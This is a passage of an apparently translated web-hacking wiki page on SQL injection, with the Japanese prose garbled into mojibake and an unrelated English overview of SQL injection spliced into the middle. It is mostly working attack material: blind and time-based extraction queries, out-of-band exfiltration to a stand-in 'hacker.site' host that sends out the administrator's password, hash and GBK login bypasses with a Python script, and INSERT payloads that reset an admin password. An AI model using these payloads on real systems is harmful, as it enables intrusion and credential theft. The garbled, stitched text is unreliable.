ã“ã‚Œã¯**ä»¥å‰ã¨åŒã˜ã‚±ãƒ¼ã‚¹**ã§ã™ãŒã€ã‚¯ã‚¨ãƒªã‹ã‚‰ã®çœŸå½ã®å¿œç­”ã‚’åŒºåˆ¥ã™ã‚‹ä»£ã‚ã‚Šã«ã€SQLã‚¯ã‚¨ãƒªã®ã‚¨ãƒ©ãƒ¼ã®æœ‰ç„¡ï¼ˆãŠãã‚‰ãHTTPã‚µãƒ¼ãƒãƒ¼ãŒã‚¯ãƒ©ãƒƒã‚·ãƒ¥ã™ã‚‹ãŸã‚ï¼‰ã‚’åŒºåˆ¥ã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®å ´åˆã€æ–‡å­—ã‚’æ­£ã—ãæ¨æ¸¬ã™ã‚‹ãŸã³ã«SQLã‚¨ãƒ©ãƒ¼ã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Time Based SQLiã®æ‚ªç”¨

ã“ã®å ´åˆã€ã‚¯ã‚¨ãƒªã®å¿œç­”ã‚’ãƒšãƒ¼ã‚¸ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã«åŸºã¥ã„ã¦åŒºåˆ¥ã™ã‚‹æ–¹æ³•ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã—ã‹ã—ã€æ¨æ¸¬ã•ã‚ŒãŸæ–‡å­—ãŒæ­£ã—ã„å ´åˆã€ãƒšãƒ¼ã‚¸ã®èª­ã¿è¾¼ã¿ã«æ™‚é–“ãŒã‹ã‹ã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã™ã§ã«ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒä½¿ç”¨ã•ã‚Œã¦ãŠã‚Šã€[SQLiã®è„†å¼±æ€§ã‚’ç¢ºèª](./#confirming-with-timing)ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## ã‚¹ã‚¿ãƒƒã‚¯ã•ã‚ŒãŸã‚¯ã‚¨ãƒª

ã‚¹ã‚¿ãƒƒã‚¯ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ã€**é€£ç¶šã—ã¦è¤‡æ•°ã®ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œ**ã§ãã¾ã™ã€‚å¾Œç¶šã®ã‚¯ã‚¨ãƒªãŒå®Ÿè¡Œã•ã‚Œã‚‹é–“ã€**çµæœã¯ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è¿”ã•ã‚Œãªã„**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ä¸»ã«**ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰è„†å¼±æ€§**ã«é–¢é€£ã—ã¦ä½¿ç”¨ã•ã‚Œã€ç¬¬äºŒã®ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦DNSãƒ«ãƒƒã‚¯ã‚¢ãƒƒãƒ—ã€æ¡ä»¶ä»˜ãã‚¨ãƒ©ãƒ¼ã€ã¾ãŸã¯æ™‚é–“é…å»¶ã‚’ãƒˆãƒªã‚¬ãƒ¼ã§ãã¾ã™ã€‚

**Oracle**ã¯**ã‚¹ã‚¿ãƒƒã‚¯ã•ã‚ŒãŸã‚¯ã‚¨ãƒª**ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã›ã‚“ã€‚**MySQLã€Microsoft**ã€ãŠã‚ˆã³**PostgreSQL**ã¯ãã‚Œã‚‰ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ï¼š`ã“ã“ã«ã‚¯ã‚¨ãƒª1; ã“ã“ã«ã‚¯ã‚¨ãƒª2`

## Out of band Exploitation

ä»–ã®**ã©ã®**æ”»æ’ƒæ‰‹æ³•ã‚‚**æ©Ÿèƒ½ã—ãªã„**å ´åˆã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æƒ…å ±ã‚’å¤–éƒ¨ãƒ›ã‚¹ãƒˆ**ï¼ˆã‚ãªãŸãŒåˆ¶å¾¡ã™ã‚‹ï¼‰ã«**é€ä¿¡**ã•ã›ã‚‹ã“ã¨ã‚’è©¦ã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€DNSã‚¯ã‚¨ãƒªã‚’ä»‹ã—ã¦ï¼š
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### XXEã‚’åˆ©ç”¨ã—ãŸå¤–éƒ¨ãƒãƒ³ãƒ‰ãƒ‡ãƒ¼ã‚¿ã®ã‚¨ã‚¯ã‚¹ãƒ•ã‚£ãƒ«ãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## è‡ªå‹•åŒ–ã•ã‚ŒãŸæ”»æ’ƒ

SQLiè„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã®[**sqlmap**](https://github.com/sqlmapproject/sqlmap)ã‚’ä½¿ç”¨ã—ãŸæ”»æ’ƒæ‰‹æ³•ã«ã¤ã„ã¦ã¯ã€[SQLMapãƒãƒ¼ãƒˆã‚·ãƒ¼ãƒˆ](sqlmap/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

## ãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼å›ºæœ‰ã®æƒ…å ±

SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã™ã§ã«ã™ã¹ã¦èª¬æ˜ã—ã¾ã—ãŸã€‚ã“ã®æ›¸ç±ã§ã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼ã«ä¾å­˜ã—ãŸã•ã‚‰ãªã‚‹ãƒˆãƒªãƒƒã‚¯ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

ã¾ãŸã€**MySQLã€PostgreSQLã€Oracleã€MSSQLã€SQLiteã€HQLã«é–¢ã™ã‚‹å¤šãã®ãƒˆãƒªãƒƒã‚¯**ã‚’[**ã“ã¡ã‚‰**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ã¯**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çš„çŸ¥è­˜ã®ä¿ƒé€²ã‚’ä½¿å‘½ã¨ã™ã‚‹**ã“ã®ä¼šè­°ã¯ã€ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®æŠ€è¡“ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å°‚é–€å®¶ã«ã¨ã£ã¦ã®ç†±ã„å‡ºä¼šã„ã®å ´ã§ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

## èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

ãƒ­ã‚°ã‚¤ãƒ³æ©Ÿèƒ½ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹ãƒªã‚¹ãƒˆï¼š

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### ç”Ÿã®ãƒãƒƒã‚·ãƒ¥èªè¨¼ãƒã‚¤ãƒ‘ã‚¹
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
ã“ã®ã‚¯ã‚¨ãƒªã¯ã€MD5ãŒtrueã§ç”Ÿã®å‡ºåŠ›ã‚’ä½¿ç”¨ã—ã¦èªè¨¼ãƒã‚§ãƒƒã‚¯ã‚’è¡Œã†éš›ã®è„†å¼±æ€§ã‚’ç¤ºã—ã¦ãŠã‚Šã€ã‚·ã‚¹ãƒ†ãƒ ãŒSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã«å¯¾ã—ã¦è„†å¼±ã«ãªã‚Šã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€å…¥åŠ›ã‚’å·¥å¤«ã—ã¦ãƒãƒƒã‚·ãƒ¥åŒ–ã™ã‚‹ã¨ã€äºˆæœŸã—ãªã„SQLã‚³ãƒãƒ³ãƒ‰ã®ä¸€éƒ¨ãŒç”Ÿæˆã•ã‚Œã€ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ãƒˆã•ã‚ŒãŸãƒãƒƒã‚·ãƒ¥èªè¨¼ãƒã‚¤ãƒ‘ã‚¹
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**æ¨å¥¨ãƒªã‚¹ãƒˆ**:

ãƒªã‚¹ãƒˆã®å„è¡Œã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ã—ã¦ä½¿ç”¨ã—ã€å¸¸ã«ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ **_Pass1234._** ã¨ã—ã¦ãã ã•ã„ã€‚\
ï¼ˆã“ã‚Œã‚‰ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®å†’é ­ã§è¨€åŠã•ã‚Œã¦ã„ã‚‹å¤§ããªãƒªã‚¹ãƒˆã«ã‚‚å«ã¾ã‚Œã¦ã„ã¾ã™ï¼‰

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

IF ' ãŒã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã¦ã„ã‚‹å ´åˆã€%A8%27 ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚ãã—ã¦ ' ãŒã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œã‚‹ã¨ã€0xA80x5c0x27 (_â•˜'_) ãŒä½œæˆã•ã‚Œã¾ã™ã€‚
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Pythonã‚¹ã‚¯ãƒªãƒ—ãƒˆï¼š
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### ãƒãƒªã‚°ãƒ­ãƒƒãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆãƒãƒ«ãƒã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆï¼‰
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## æŒ¿å…¥ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆ

### æ—¢å­˜ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ/ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹

ã“ã‚Œã‚’è¡Œã†ã«ã¯ã€ãŠãã‚‰ããƒ¦ãƒ¼ã‚¶ãƒ¼ã®å ´åˆã¯**ç®¡ç†è€…**ã¨ã—ã¦åå‰ãŒä»˜ã‘ã‚‰ã‚ŒãŸ**ã€Œãƒã‚¹ã‚¿ãƒ¼ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã€ã¨ã„ã†æ–°ã—ã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã—ã‚ˆã†ã¨ã—ã¦ãã ã•ã„ï¼š

- ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’**AdMIn**ã¨ã—ã¦ä½œæˆã™ã‚‹ï¼ˆå¤§æ–‡å­—ã¨å°æ–‡å­—ã‚’åŒºåˆ¥ï¼‰
- ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’**admin=**ã¨ã—ã¦ä½œæˆã™ã‚‹
- **SQL Truncation Attack**ï¼ˆãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚„ãƒ¡ãƒ¼ãƒ«ã«**æ–‡å­—æ•°åˆ¶é™**ãŒã‚ã‚‹å ´åˆï¼‰ --> åå‰ãŒ**admin \[ãŸãã•ã‚“ã®ã‚¹ãƒšãƒ¼ã‚¹]**ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã™ã‚‹

#### SQL Truncation Attack

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒè„†å¼±ã§ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®æœ€å¤§æ–‡å­—æ•°ãŒä¾‹ãˆã°30ã§ã‚ã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼**admin**ã‚’ãªã‚Šã™ã¾ã™å ´åˆã€"_admin \[30ã‚¹ãƒšãƒ¼ã‚¹] a_"ã¨ã„ã†ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½œæˆã—ã¦ã¿ã¦ãã ã•ã„ã€‚ãã—ã¦ã€ä»»æ„ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¨­å®šã—ã¾ã™ã€‚

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¯ã€å°å…¥ã•ã‚ŒãŸ**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã«å­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’**ç¢ºèª**ã—ã¾ã™ã€‚ã‚‚ã—å­˜åœ¨ã—ãªã„å ´åˆã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã‚’**è¨±å¯ã•ã‚ŒãŸæœ€å¤§æ–‡å­—æ•°**ï¼ˆã“ã®å ´åˆã¯"_admin \[25ã‚¹ãƒšãƒ¼ã‚¹]_"ï¼‰ã«**åˆ‡ã‚Šå–ã‚Š**ã€ãã—ã¦**è‡ªå‹•çš„ã«æœ«å°¾ã®ã™ã¹ã¦ã®ã‚¹ãƒšãƒ¼ã‚¹ã‚’å‰Šé™¤ã—ã¦**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã€Œadminã€**ã®**æ–°ã—ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚’æ›´æ–°ã—ã¾ã™ï¼ˆã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã‚ŒãŒæ©Ÿèƒ½ã—ã¦ã„ãªã„ã¨ã„ã†ã“ã¨ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚

è©³ç´°æƒ…å ±: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_æ³¨: ã“ã®æ”»æ’ƒã¯ã€æœ€æ–°ã®MySQLã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã§ã¯ä¸Šè¨˜ã®ã‚ˆã†ã«ã¯æ©Ÿèƒ½ã—ãªããªã‚Šã¾ã—ãŸã€‚æ¯”è¼ƒã¯å¼•ãç¶šããƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ«å°¾ã®ç©ºç™½ã‚’ç„¡è¦–ã—ã¾ã™ãŒã€ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®é•·ã•ã‚ˆã‚Šã‚‚é•·ã„æ–‡å­—åˆ—ã‚’æŒ¿å…¥ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã€æŒ¿å…¥ã¯å¤±æ•—ã—ã¾ã™ã€‚ã“ã‚Œã«ã¤ã„ã¦ã®è©³ç´°æƒ…å ±ã¯ã“ã¡ã‚‰ã‚’å‚ç…§ã—ã¦ãã ã•ã„: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQLæŒ¿å…¥æ™‚ã®æ™‚é–“ãƒ™ãƒ¼ã‚¹ã®ãƒã‚§ãƒƒã‚¯

VALUESã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’çµ‚äº†ã™ã‚‹ã¨è€ƒãˆã‚‰ã‚Œã‚‹ã ã‘ã®`','',''`ã‚’è¿½åŠ ã—ã¾ã™ã€‚é…å»¶ãŒç™ºç”Ÿã—ãŸå ´åˆã€SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒç™ºç”Ÿã—ã¦ã„ã¾ã™ã€‚
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

MySQLã®`ON DUPLICATE KEY UPDATE`å¥ã¯ã€UNIQUEã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã‚„PRIMARY KEYã«é‡è¤‡ã™ã‚‹å€¤ãŒæŒ¿å…¥ã•ã‚Œã‚ˆã†ã¨ã—ãŸå ´åˆã«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãŒå–ã‚‹ã¹ãã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æŒ‡å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚æ¬¡ã®ä¾‹ã¯ã€ã“ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã—ã¦ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š

ä¾‹ï¼šã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰

ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€`users`ãƒ†ãƒ¼ãƒ–ãƒ«ã«2ã¤ã®è¡Œã‚’æŒ¿å…¥ã—ã‚ˆã†ã¨ã™ã‚‹ã‚ˆã†ã«ä½œæˆã•ã‚Œã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚æœ€åˆã®è¡Œã¯ãƒ‡ã‚³ã‚¤ã§ã‚ã‚Šã€2ç•ªç›®ã®è¡Œã¯æ—¢å­˜ã®ç®¡ç†è€…ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å¯¾è±¡ã¨ã—ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ›´æ–°ã™ã‚‹ã“ã¨ã‚’æ„å›³ã—ã¦ã„ã¾ã™ã€‚
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
### æƒ…å ±ã®æŠ½å‡º

#### åŒæ™‚ã«2ã¤ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹

æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½œæˆã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨é›»å­ãƒ¡ãƒ¼ãƒ«ãŒå¿…è¦ã§ã™ã€‚
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### 10é€²æ•°ã¾ãŸã¯16é€²æ•°ã‚’ä½¿ç”¨ã™ã‚‹

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€1ã¤ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆã™ã‚‹ã ã‘ã§æƒ…å ±ã‚’æŠ½å‡ºã§ãã¾ã™ã€‚ã‚³ãƒ¡ãƒ³ãƒˆã‚’è¿½åŠ ã™ã‚‹å¿…è¦ã¯ãªã„ã“ã¨ã«æ³¨æ„ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

**hex2dec** ã¨ **substr** ã‚’ä½¿ç”¨ã™ã‚‹:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
ä»¥ä¸‹ã¯ã€ãƒãƒƒã‚­ãƒ³ã‚°æŠ€è¡“ã«é–¢ã™ã‚‹æœ¬ã®å†…å®¹ã§ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«pentesting-web/sql-injection/README.mdã‹ã‚‰ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã§ã™ã€‚

## SQL Injection

### Description

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

### Impact

The impact of an SQL injection attack can vary greatly depending on the application, the functionality of the website, and the data that is stored in the database. Some of the potential consequences of a successful SQL injection attack include unauthorized access to sensitive data, such as personal information, financial data, or intellectual property; the ability to execute operations on the database, such as adding, modifying, or deleting records; and in some cases, the ability to take control of the server that hosts the database.

### Detection

Detecting SQL injection vulnerabilities can be challenging, as they can be present in both the frontend and backend components of a web application. Automated tools can be used to scan for common SQL injection vulnerabilities, but manual testing is often required to identify more complex issues. Common indicators of SQL injection include error messages that reveal details about the database structure, unexpected changes in application behavior, and the presence of suspicious or malformed input in application requests.

### Prevention

Preventing SQL injection attacks requires a combination of secure coding practices and input validation techniques. Developers should use parameterized queries or prepared statements to prevent malicious input from being interpreted as SQL commands. Additionally, input should be validated on the client side to ensure that it conforms to expected formats and does not contain any potentially harmful characters. Regular security assessments and code reviews can help identify and address SQL injection vulnerabilities before they can be exploited by attackers.
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
**hex**ã¨**replace**ï¼ˆãŠã‚ˆã³**substr**ï¼‰ã‚’ä½¿ç”¨ã™ã‚‹ï¼š
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/)ã¯**ã‚¹ãƒšã‚¤ãƒ³**ã§æœ€ã‚‚é–¢é€£æ€§ã®é«˜ã„ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ™ãƒ³ãƒˆã§ã‚ã‚Šã€**ãƒ¨ãƒ¼ãƒ­ãƒƒãƒ‘**ã§ã‚‚æœ€ã‚‚é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã®ä¸€ã¤ã§ã™ã€‚**æŠ€è¡“çŸ¥è­˜ã®ä¿ƒé€²ã‚’ä½¿å‘½**ã¨ã—ã¦ã€ã“ã®ä¼šè­°ã¯ã‚ã‚‰ã‚†ã‚‹åˆ†é‡ã®ãƒ†ã‚¯ãƒãƒ­ã‚¸ãƒ¼ã¨ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å°‚é–€å®¶ã®ç†±ã„äº¤æµã®å ´ã¨ãªã£ã¦ã„ã¾ã™ã€‚

{% embed url="https://www.rootedcon.com/" %}

## ãƒ«ãƒ¼ãƒ†ãƒƒãƒ‰SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

ãƒ«ãƒ¼ãƒ†ãƒƒãƒ‰SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã¯ã€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯èƒ½ãªã‚¯ã‚¨ãƒªãŒå‡ºåŠ›ã‚’æä¾›ã™ã‚‹ã‚‚ã®ã§ã¯ãªãã€ã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯èƒ½ãªã‚¯ã‚¨ãƒªã®å‡ºåŠ›ãŒå‡ºåŠ›ã‚’æä¾›ã™ã‚‹ã‚¯ã‚¨ãƒªã«ç§»å‹•ã™ã‚‹çŠ¶æ³ã§ã™ã€‚ ([From Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

ä¾‹ï¼š
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## WAF ãƒã‚¤ãƒ‘ã‚¹

[ã“ã“ã‹ã‚‰åˆæœŸãƒã‚¤ãƒ‘ã‚¹](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### ã‚¹ãƒšãƒ¼ã‚¹ãªã—ãƒã‚¤ãƒ‘ã‚¹

